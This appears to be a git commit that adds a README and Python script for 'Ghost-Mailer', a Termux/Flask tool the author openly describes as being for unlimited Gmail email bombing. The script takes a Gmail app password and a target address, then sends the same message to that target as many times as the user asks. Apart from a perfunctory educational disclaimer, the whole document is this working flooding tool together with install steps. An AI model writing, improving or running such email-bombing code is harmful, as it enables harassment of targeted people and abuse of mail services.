86c10cf3a8d4a5cf42fcb286c12e5c0e00f0b980
* <frabby983@gmail.com>
2022-12-13 14:20:05 +0600

    Initial Commit

---
+++ README.md
@@ -0,0 +1,37 @@
+## What is Ghost-Mailer
+
+Ghost-Mailer is a python script for Gmail-Bombing.By using this script you can do Unlimited Email bombing. 
+
+## Usages
+
+* **Requirements:**
+   * TERMUX <a href="https://f-droid.org/repo/com.termux_118.apk">Download</a>
+   * Git
+   * Python
+
+* **Installation:**
+   * `pkg update && pkg upgrade`   
+
+   * `pkg install git -y`
+
+   * `git clone https://github.com/fh-rabbi/Ghost-Mailer`
+   
+   * `pkg install python -y`
+   
+   * `pip install flask`
+   
+   * `pip install flask-mail`
+
+* **Run:**
+   * `cd Ghost-Mailer`
+   
+   * `python app.py`
+
+## NOTE
+> You need to generate app-password in your gmail-account.For generate app password read the bellow instruction:
+* https://github.io/fhrabbi/isisieiu
+
+## WARNING
+
+*This tool is only for educational purpose.So, I will not be responsible if you use this tool for bad purpose.*
+
---
+++ app.py
@@ -0,0 +1,95 @@
+# Author: Fazle Rabbi
+# Date: 13 December, 2022
+# Don't change my credit
+# Changing credit don't made you a coder!
+# This source code is open so that you can gain some knowledge from this code.
+# WARNING: This tool is just for fun & educational purpose.
+# So, I will not be responsible if you use this tool for bad purpose.Keep in mind!
+from flask import *
+from flask_mail import *
+from time import sleep
+from getpass import getpass
+import os
+app = Flask(__name__)
+
+# Colors
+red = '\033[1;91m'
+green = '\033[1;92m'
+yellow = '\033[1;93m'
+blue = '\033[1;94m'
+cyan = '\033[1;96m'
+white = '\033[1;0m'
+
+os.system('clear')
+
+# Banner
+def banner():
+   print(f"""{green}
+
+   _____  _                  _   
+  / ____|| |                | |  
+ | |  __ | |__    ___   ___ | |_ 
+ | | |_ || '_ \  / _ \ / __|| __|
+ | |__| || | | || (_) |\__ \| |_ 
+  \_____||_| |_| \___/ |___/ \__|
+                _  _             
+     /\/\    __ _ (_)| |  ___  _ __ 
+    /    \  / _` || || | / _ \| '__|
+   / /\/\ \| (_| || || ||  __/| |   
+   \/    \/ \__,_||_||_| \___||_|   
+                                 
+{white}💻 {yellow}Coded By Fazle Rabbi{white}
+{white}🌐 {yellow}https://github.com/fh-rabbi{white}
+   """)
+
+# Menu
+def menu():
+   email = input(f'{white}[?] {green}Your Gmail:{white}')
+   print('\n')
+   print(f'{red}🚨 NOTE: \033[31m Don\'t use your gmail account password.You need to use App Password.For generate App Password visit bellow link and read the instruction: {white}')
+   print('🌐 https://wwww.frabbi.cf/iwjsjdk92js')
+   print('\n')
+   password = getpass(f'[?] {green}Your Password:{white}')
+   name = input(f'[?] {green}Your Name:{white}')
+   subject = input(f'[?] {green}Email Subject:{white}')
+   message = input(f'[?] {green}Your Message:{white}')
+   target = input(f'[?] {green}Target Email:{white}')
+   amount = input(f'[?] {green}Amount Of Email:{white}')
+   print(f'[*] {yellow}Sending Email Please Wait...')
+   # Configure the Flask Mail
+   app.config.update(
+         MAIL_SERVER = 'smtp.gmail.com',
+         MAIL_PORT = 465,
+         MAIL_USERNAME = email,
+         MAIL_PASSWORD = password,
+         MAIL_USE_SSL = True
+   )
+   # Instantiate the Mail class.
+   mail = Mail(app)
+   sendMail(email,password,name,subject,message,target,mail,amount)
+   
+# Send Mail
+def sendMail(email,password,name,subject,message,target,mail,amount):
+   with app.app_context():
+      try:
+         for i in range(0,int(amount)):
+            mail.send_message(
+               subject,
+               sender = name,
+               recipients = [target],
+               body = message
+            )
+            print(f'{white}[✓] {green}Message Sent Successful ➡️ {white} {i+1}')
+         opt = input(f"{white}[*] {yellow}Press Enter For Continue:")
+         if opt or opt == '':
+            os.system('clear')
+            os.system('python app.py')
+      except:
+            print(f'{red}[!]Oops! Something went wrong')
+            sleep(1)
+            os.system('clear')
+            os.system('python app.py')
+         
+        
+banner()
+menu()
